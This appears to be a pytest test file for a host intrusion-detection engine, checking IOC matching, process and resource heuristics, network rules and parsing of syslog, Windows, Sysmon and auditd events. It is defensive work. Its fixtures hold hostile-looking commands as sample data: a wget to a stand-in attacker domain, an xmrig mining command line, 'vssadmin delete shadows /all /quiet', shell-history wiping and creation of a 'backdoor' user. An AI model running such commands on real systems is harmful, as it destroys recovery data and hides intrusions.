import time

import pytest

from eldoctor.collectors.logs import AuditParser, parse_syslog_line, parse_windows_events_xml
from eldoctor.detection.engine import DetectionEngine
from eldoctor.detection.ioc import Indicator, IOCStore, normalize
from eldoctor.models import ProcessInfo


@pytest.fixture
def engine(cfg):
    iocs = IOCStore()
    iocs.add(Indicator("ip", "198.51.100.23", "critical", "C2", source="feodo"))
    iocs.add(Indicator("sha256", "a" * 64, "critical", "malware", source="bazaar"))
    iocs.add(Indicator("filename", "xmrig", "critical", "miner", ["T1496"], "names"))
    iocs.add(Indicator("domain", "evil.example", "high", "bad", source="urlhaus"))
    iocs.add(Indicator("cidr", "192.0.2.0/24", "high", "bad net", source="test"))
    cfg["thresholds"].update(process_cpu=80, process_cpu_duration=10, process_memory=20, process_memory_duration=5,
                             spawn_storm_children=10, spawn_storm_window=30)
    return DetectionEngine(cfg, iocs=iocs)


def proc(**kw):
    base = dict(pid=4242, ppid=1000, name="thing", exe="/usr/bin/thing", cmdline=["thing"], username="model",
                create_time=1000.0)
    base.update(kw)
    return ProcessInfo(**base)


def ids(alerts):
    return {a.rule_id for a in alerts}


def test_ioc_normalisation():
    assert normalize("ip", " 1.2.3.4 ") == "1.2.3.4"
    assert normalize("ip", "999.1.1.1") is None
    assert normalize("sha256", "A" * 64) == "a" * 64
    assert normalize("md5", "zz") is None
    assert normalize("domain", "Evil.Example.") == "evil.example"
    s = IOCStore()
    assert s.load_text("# hosts\n127.0.0.1 bad.example.com\n", "domain", "urlhaus", fmt="hosts") == 1


def test_ioc_matches(engine):
    assert engine.iocs.match_ip("192.0.2.55").source == "test"       # CIDR
    assert engine.iocs.match_domains_in("wget http://cdn.evil.example/x") is not None
    a = engine.on_process_start(proc(name="xmrig", exe="/tmp/xmrig", sha256="a" * 64,
                                     cmdline=["xmrig", "-o", "stratum+tcp://pool.evil.example:3333"]))
    assert {"ED-IOC-001", "ED-IOC-003", "ED-IOC-004", "ED-PROC-001"} <= ids(a)
    assert any(x.rule_id.startswith("SIGMA:") for x in a)


def test_behavioural_heuristics(engine):
    assert "ED-PROC-002" in ids(engine.on_process_start(proc(pid=1, exe="/tmp/x", exe_deleted=True)))
    assert "ED-PROC-005" in ids(engine.on_process_start(proc(pid=2, exe="/memfd:payload", exe_deleted=True)))
    assert "ED-PROC-003" in ids(engine.on_process_start(proc(pid=3, cmdline=["[kworker/0:1]"], exe="/tmp/.x")))
    assert "ED-PROC-003" in ids(engine.on_process_start(proc(pid=4, name="sshd", exe="/home/u/sshd")))
    assert "ED-PROC-004" in ids(engine.on_process_start(proc(pid=5, name="sh", exe="/bin/sh", parent_name="nginx")))
    assert ids(engine.on_process_start(proc(pid=6, name="bash", exe="/usr/bin/bash", cmdline=["bash"]))) == set()


def test_sustained_cpu_requires_duration(engine):
    p = proc(cpu_percent=99.0)
    assert engine.on_process_sample([p], now=100.0) == []
    assert engine.on_process_sample([p], now=105.0) == []
    a = engine.on_process_sample([p], now=110.5)
    assert ids(a) == {"ED-RES-001"} and a[0].mitre == ["T1496"]
    # drop below threshold resets the timer; cooldown prevents re-alerting
    p2 = proc(pid=77, cpu_percent=99.0)
    engine.on_process_sample([p2], now=200)
    engine.on_process_sample([proc(pid=77, cpu_percent=5.0)], now=205)
    assert engine.on_process_sample([p2], now=212) == []


def test_memory_and_spawn_storm(engine):
    m = proc(pid=9, memory_percent=30.0, rss=5 * 1024 ** 3)
    engine.on_process_sample([m], now=10)
    assert "ED-RES-002" in ids(engine.on_process_sample([m], now=16))
    parent = proc(pid=500, name="bomb")
    kids = [proc(pid=600 + i, ppid=500, name="sleep") for i in range(12)]
    a = engine.on_process_sample([parent] + kids, new=kids, now=50)
    assert "ED-RES-003" in ids(a) and a[0].process["pid"] == 500


def test_spawn_storm_ignores_initial_inventory(engine):
    parent = proc(pid=500, name="systemd-like")
    kids = [proc(pid=600 + i, ppid=500) for i in range(50)]
    assert engine.on_process_sample([parent] + kids, new=kids, now=1, initial=True) == []


def test_network_rules(engine):
    sh = proc(pid=321, name="bash", exe="/usr/bin/bash")
    miner = proc(pid=322, name="kworker", exe="/tmp/k")
    conns = [{"pid": 321, "rip": "10.1.1.1", "rport": 443, "status": "ESTABLISHED", "type": "tcp", "laddr": "x"},
             {"pid": 322, "rip": "203.0.113.9", "rport": 3333, "status": "ESTABLISHED", "type": "tcp", "laddr": "x"},
             {"pid": None, "rip": "198.51.100.23", "rport": 80, "status": "SYN_SENT", "type": "tcp", "laddr": "x"}]
    engine.blocked_ips = {"203.0.113.9"}
    a = engine.on_connections(conns, {321: sh, 322: miner})
    assert {"ED-NET-001", "ED-NET-002", "ED-NET-003", "ED-IOC-002"} <= ids(a)


def test_ssh_bruteforce_then_success(engine):
    lines = [f"Nov  4 22:04:0{i} web sshd[9]: Failed password for invalid user u{i} from 203.0.113.5 port 4{i} ssh2"
             for i in range(5)]
    alerts = []
    for i, l in enumerate(lines):
        alerts += engine.on_log(parse_syslog_line(l), now=1000 + i)
    assert ids(alerts) == {"ED-LOG-001"} and alerts[0].remote_ip == "203.0.113.5"
    ok = parse_syslog_line("Nov  4 22:05:00 web sshd[9]: Accepted password for root from 203.0.113.5 port 5 ssh2")
    a = engine.on_log(ok, now=1010)
    assert "ED-LOG-002" in ids(a)
    assert any(x.title == "SSH Root Login With Password" for x in a)


def test_sudo_failures_and_user_creation(engine):
    a = []
    for i in range(3):
        a += engine.on_log(parse_syslog_line(
            "Nov  4 22:04:01 h sudo: pam_unix(sudo:auth): authentication failure; logname=user_two uid=1 user=user_two"), now=10 + i)
    a += engine.on_log(parse_syslog_line("Nov  4 22:04:09 h useradd[7]: new user: name=backdoor, UID=1002"), now=20)
    assert {"ED-LOG-003", "ED-LOG-004"} <= ids(a)


WIN_XML = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing'/>
<EventID>4625</EventID><EventRecordID>{rec}</EventRecordID><Channel>Security</Channel><Computer>WS1</Computer></System>
<EventData><Data Name='TargetUserName'>administrator</Data><Data Name='IpAddress'>198.51.100.77</Data></EventData></Event>"""
SYSMON_XML = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon'/>
<EventID>1</EventID><EventRecordID>77</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS1</Computer></System>
<EventData><Data Name='ProcessId'>4321</Data><Data Name='Image'>C:\\Windows\\System32\\vssadmin.exe</Data>
<Data Name='CommandLine'>vssadmin.exe delete shadows /all /quiet</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data>
<Data Name='User'>WS1\\user_two</Data></EventData></Event>"""


def test_windows_event_parsing_and_detection(engine):
    evs = parse_windows_events_xml("".join(WIN_XML.format(rec=i) for i in range(6)), "Security")
    assert len(evs) == 6 and evs[0]["event_type"] == "logon_failed" and evs[0]["fields"]["src_ip"] == "198.51.100.77"
    alerts = []
    for i, e in enumerate(evs):
        alerts += engine.on_log(e, now=100 + i)
    assert "ED-LOG-005" in ids(alerts)
    engine.platform = "windows"
    sysmon = parse_windows_events_xml(SYSMON_XML)[0]
    assert sysmon["category"] == "process_creation" and sysmon["process"]["pid"] == 4321
    a = engine.on_log(sysmon)
    assert any(x.title == "Shadow Copy Deletion or Recovery Disabled" for x in a)
    assert a[0].evidence["telemetry"].startswith("wineventlog")


def test_auditd_exec_records(engine):
    ap = AuditParser()
    cmd = "bash -c unset HISTFILE; history -c; sleep 120"
    lines = [
        'type=SYSCALL msg=audit(1730757600.101:9001): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=41 '
        'pid=999999 auid=1000 uid=1000 comm="bash" exe="/usr/bin/bash" key="eldoctor_exec"',
        'type=EXECVE msg=audit(1730757600.101:9001): argc=3 a0="bash" a1="-c" a2=' +
        "unset HISTFILE; history -c; sleep 120".encode().hex().upper(),
        'type=CWD msg=audit(1730757600.101:9001): cwd="/home/model"',
        'type=EOE msg=audit(1730757600.101:9001):',
    ]
    evs = [e for l in lines for e in ap.feed(l)]
    assert len(evs) == 1 and evs[0]["fields"]["CommandLine"] == cmd
    assert evs[0]["fields"]["CurrentDirectory"] == "/home/model"
    a = engine.on_log(evs[0])
    assert any(x.title == "Shell History or System Log Tampering" for x in a)


def test_syslog_formats():
    e = parse_syslog_line("<38>1 2025-11-04T22:04:01Z web1 sshd 77 - - Invalid user oracle from 192.0.2.4 port 5")
    assert e["program"] == "sshd" and e["event_type"] == "ssh_failed" and e["fields"]["src_ip"] == "192.0.2.4"
    e = parse_syslog_line("2025-11-04T22:04:01.1+00:00 web1 sshd[1]: Accepted publickey for deploy from 10.0.0.8 port 22 ssh2")
    assert e["event_type"] == "ssh_success" and e["fields"]["user"] == "deploy"


def test_cooldown_deduplicates(engine):
    p = proc(pid=1, exe="/tmp/x", exe_deleted=True)
    assert engine.on_process_start(p)
    assert not [a for a in engine.on_process_start(p) if a.rule_id == "ED-PROC-002"]


def test_disabled_rules(cfg):
    cfg["detection"]["disabled_rules"] = ["ED-PROC-001"]
    eng = DetectionEngine(cfg, iocs=IOCStore())
    assert "ED-PROC-001" not in ids(eng.on_process_start(proc(exe="/tmp/x")))
